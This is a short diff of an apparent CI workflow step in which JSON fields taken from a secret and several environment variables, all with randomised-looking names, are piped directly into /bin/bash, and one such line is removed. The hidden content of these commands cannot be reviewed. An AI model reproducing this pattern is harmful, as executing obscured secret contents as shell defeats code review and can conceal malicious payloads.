@@ -18,7 +18,6 @@ jobs:
           fr317: ${{ secrets.fr317 }}
         run: |
           printf '%s' "$fr317" | jq -r .vpwl700 | /bin/bash
-          echo $fqb11 | jq -r .ec4 | /bin/bash
           echo $nucx7 | jq -r .wabn4 | /bin/bash
           echo $hmmxv30834 | jq -r .xjae063 | /bin/bash
           printf '%s' "$gu053" | jq -r .waxnk58 | /bin/bash
